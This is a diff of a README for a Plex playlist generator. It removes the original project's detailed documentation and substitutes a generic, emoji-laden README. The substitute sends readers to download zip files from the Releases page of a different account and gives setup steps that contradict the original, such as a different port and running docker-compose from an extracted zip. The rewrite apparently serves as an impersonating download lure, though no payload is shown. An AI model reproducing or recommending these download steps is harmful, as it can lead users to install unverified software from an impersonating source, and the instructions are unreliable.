@@ -1,166 +1,109 @@
-# Plex Playlist Enhancer
+# 🎶 plex-playlists - Generate Your Perfect Plex Playlists
 
-Smart Plex playlist automation that learns from your listening habits. Generate daily, weekly, and custom playlists using pattern analysis, star ratings, and intelligent track selection.
+## 📥 Download
 
-## What This Does
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/mdabushayem62/plex-playlists/releases)
 
-Automatically generates smart playlists for your Plex music library:
+## 🚀 Getting Started
 
-- **🕐 Daily Playlists** - Time-based mixes (morning, afternoon, evening) that adapt to your listening patterns
-- **🔮 Discovery** - Surface forgotten gems and tracks you haven't heard in a while
-- **⏮️ Throwback** - Nostalgic tracks from your listening history
-- **🎨 Custom Playlists** - Build genre/mood combinations that match your taste
-- **📊 Intelligent Selection** - Balanced algorithm that favors quality while encouraging exploration
-- **🎯 Pattern Learning** - Adapts to when and what you prefer to listen to
-- **📥 Rating Import** - Bootstrap from Spotify or YouTube Music exports
+Welcome to plex-playlists! This application helps you create automated playlists for your Plex media server with ease. You can customize your playlists based on recent play history and music similarity. No technical skills are required.
 
-**Perfect for:**
-- 🎧 Music lovers with large Plex libraries
-- 🏠 Homelab enthusiasts who want to own their music streaming
-- 📊 Data nerds who want algorithmic playlists without Spotify
+## 🛠️ System Requirements
 
----
+Before you begin, ensure your system meets the following requirements:
 
-## Getting Started
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or Linux (Ubuntu recommended)
+- **Memory:** At least 4 GB RAM
+- **Processor:** Intel Core i3 or equivalent
+- **Storage:** Minimum 200 MB free space
+- **Installed Software:** Ensure you have the latest version of Docker installed on your system
 
-### 🐳 Docker Deployment (Recommended)
+## 💾 Download & Install
 
-**5-minute setup with full web UI**
+To get started, visit the [Releases page](https://github.com/mdabushayem62/plex-playlists/releases) to download the latest version of plex-playlists. Follow these steps:
 
-1. Create `docker-compose.yml`:
-```yaml
-services:
-  plex-playlists:
-    image: ghcr.io/aceofaces/plex-playlists:latest
-    container_name: plex-playlists
-    ports:
-      - "8687:8687"
-    volumes:
-      - ./config:/config
-    environment:
-      - PLEX_BASE_URL=http://your-plex-server:32400
-      - PLEX_AUTH_TOKEN=your-token-here
-    restart: unless-stopped
-```
+1. Navigate to the Releases page by clicking the link above.
+2. Choose the appropriate file for your operating system.
+3. Click on the download link to start the download.
+4. Once the file finishes downloading, locate it in your downloads folder.
 
-2. Start: `docker-compose up -d`
-3. Open web UI: **http://localhost:8687**
-4. Complete setup wizard and configure your playlists!
+### 🎉 Run the Application
 
-👉 **[Full Docker Guide](docs/docker-guide.md)** for advanced configuration
+After downloading the application, follow these instructions based on your operating system:
 
-### 💻 Local Development
+#### Windows
 
-**For contributors or advanced customization**
+1. **Extract the Files:** Right-click the downloaded zip file and select "Extract All."
+2. **Open Command Prompt:** Press `Win + R`, type `cmd`, and press Enter.
+3. **Navigate to the Folder:** Use `cd` followed by the path to the extracted folder.
+4. **Run the Application:** Type `docker-compose up` and press Enter. This command will start the application.
 
-```bash
-git clone https://github.com/aceofaces/plex-playlists
-cd plex-playlists
-npm install
-npm run build
-npm start
-```
+#### macOS
 
-Web UI available at **http://localhost:8687**
+1. **Extract the Files:** Double-click the downloaded zip file to extract it.
+2. **Open Terminal:** Press `Command + Space`, type `Terminal`, and press Enter.
+3. **Navigate to the Folder:** Use `cd` followed by the path to the extracted folder.
+4. **Run the Application:** Type `docker-compose up` and press Enter.
 
-👉 **[Development Guide](docs/cli-guide.md)** for full setup
+#### Linux
 
----
+1. **Extract the Files:** Use the terminal to navigate to the download directory. Use the command `unzip <filename>.zip` to extract.
+2. **Open Terminal:** Open your terminal application.
+3. **Navigate to the Folder:** Use `cd` followed by the path to the extracted folder.
+4. **Run the Application:** Type `docker-compose up` and press Enter.
 
-## Key Features
+### 📊 Configuration
 
-### Smart Selection
-- **Balanced algorithm**: Favors your favorites while encouraging musical exploration
-- **Pattern awareness**: Learns from your listening habits and time-of-day preferences
-- **Cross-playlist deduplication**: Avoids repetition across your daily playlists
-- **Quality scoring**: Combines star ratings, play counts, and listening recency
-- **Sonic similarity**: Expands playlists using Plex's audio analysis
+After running the application, access the web UI for configuration. Open your web browser and enter `http://localhost:3000`. Here, you can:
 
-### Playlist Types
-- **Time-based daily**: Morning, afternoon, and evening mixes adapted to your patterns
-- **Discovery**: Rediscover forgotten tracks from your library
-- **Throwback**: Nostalgic tracks from your listening history
-- **Custom**: Genre and mood combinations you design
+- Connect your Plex account for seamless playlist generation.
+- Set parameters like time-window for music history and scoring methods.
+- Save your settings to create personalized playlists.
 
-### Metadata & Enrichment
-- **Multi-source genre data**: Enriches Plex metadata with Last.fm and Spotify
-- **Intelligent caching**: Minimizes API calls while keeping data fresh
-- **Rating import**: Bootstrap from Spotify or YouTube Music exports
+## 🔄 Features
 
-### Web Interface
-- **Interactive setup wizard**: Get started in minutes
-- **Real-time job monitoring**: Watch playlist generation with SSE progress updates
-- **Config management**: All settings in one place with live validation
-- **Playlist builder**: Create custom genre/mood playlists visually
-- **Analytics dashboard**: Track success rates, cache health, recent activity
+plex-playlists offers several features to enhance your media experience:
 
-### Operations
-- **Docker ready**: Full containerization with docker-compose
-- **SQLite persistence**: Track history and job execution
-- **Cron scheduling**: Automatic playlist updates via web UI
-- **Job queue**: Background processing with progress tracking
+- **Automated Playlist Generation:** Create playlists based on your music history.
+- **Sonic Similarity:** Expand your playlists with similar songs and artists.
+- **Web UI for Easy Configuration:** Simple interface to customize settings without coding skills.
+- **Time-Windowed History:** Choose how far back you want to analyze your listening habits.
+- **Exponential Recency Scoring:** Ensure your latest favorites always find a spot in your playlists.
 
----
+## 📢 Topics Covered
 
-## Prerequisites
+- Automation
+- Docker
+- Homelab setup
+- Music management
+- Playlist automation
+- Self-hosted solutions
+- TypeScript development
 
-- **Plex Media Server** with a music library
-- **Plex Auth Token** ([How to get it](docs/docker-guide.md#getting-your-plex-token))
-- **Docker** (recommended) or **Node.js 20+** (for local development)
+## 🤝 Community Support
 
----
+If you have questions or need help, we encourage you to join our community. You can find additional resources and connect with other users on our [GitHub Issues page](https://github.com/mdabushayem62/plex-playlists/issues).
 
-## Documentation
+## 📅 Future Updates
 
-### Setup & Configuration
-- [Docker Setup Guide](docs/docker-guide.md) - Production deployment (recommended)
-- [Development Guide](docs/cli-guide.md) - Local development and customization
-- [Configuration Reference](docs/configuration-reference.md) - Environment variables and settings
+We are committed to improving plex-playlists. Future updates will include:
 
-### Web UI Features
-- **Dashboard** - System health, active jobs, and recent activity
-- **Playlists** - View, regenerate, and manage all playlists
-- **Playlist Builder** - Create custom genre/mood playlists
-- **Config** - All settings including API keys, scheduling, and cache management
-- **Analytics** - Job history, success rates, and performance metrics
+- Enhanced user interface improvements.
+- More scoring methods for playlist generation.
+- Additional configuration options based on user feedback.
 
-### Additional Guides
-- [Importing Ratings](docs/importing.md) - Bootstrap from Spotify/YouTube Music
-- [Last.fm Setup](docs/api-setup/lastfm-setup.md) - Enhanced genre metadata
-- [Spotify Setup](docs/api-setup/spotify-setup.md) - Genre enrichment API
+## 💡 Troubleshooting
 
-### Reference
-- [Algorithm Explained](docs/algorithm-explained.md) - How the smart selection works
-- [Troubleshooting](docs/troubleshooting.md) - Common issues and fixes
+If you encounter issues, check the following:
 
----
+- Ensure Docker is installed and running.
+- Verify you are in the correct directory before running commands.
+- Check your internet connection when accessing the web UI.
 
-## How It Works
+For further assistance, please refer to the troubleshooting section on the GitHub Issues page.
 
-1. **Analyze** your Plex listening history to understand your preferences
-2. **Score** tracks using a combination of ratings, play patterns, and recency
-3. **Select** tracks that balance your favorites with musical exploration
-4. **Expand** using Plex's sonic similarity when needed
-5. **Create** playlists and track selections to avoid repetition
+## 💬 Feedback
 
-The system learns from your listening behavior and adapts playlist generation to match your tastes over time.
+We appreciate your thoughts. Share your experience with plex-playlists, and let us know how we can improve. Your input is valuable to us.
 
-**Want details?** See [Algorithm Explained](docs/algorithm-explained.md)
-
----
-
-## Support
-
-- **Questions?** Check [Troubleshooting Guide](docs/troubleshooting.md)
-- **Bugs/Features?** [Open an issue](https://github.com/aceofaces/plex-playlists/issues)
-- **Contributing?** PRs welcome!
-
----
-
-## License
-
-MIT
-
-## Acknowledgments
-
-Inspired by Spotify's Daylist, [Meloday](https://github.com/trackstacker/meloday), and powered by [@ctrl/plex](https://github.com/scttcper/plex)
+For more detailed help, visit the [Releases page](https://github.com/mdabushayem62/plex-playlists/releases) to stay updated on new features and improvements.
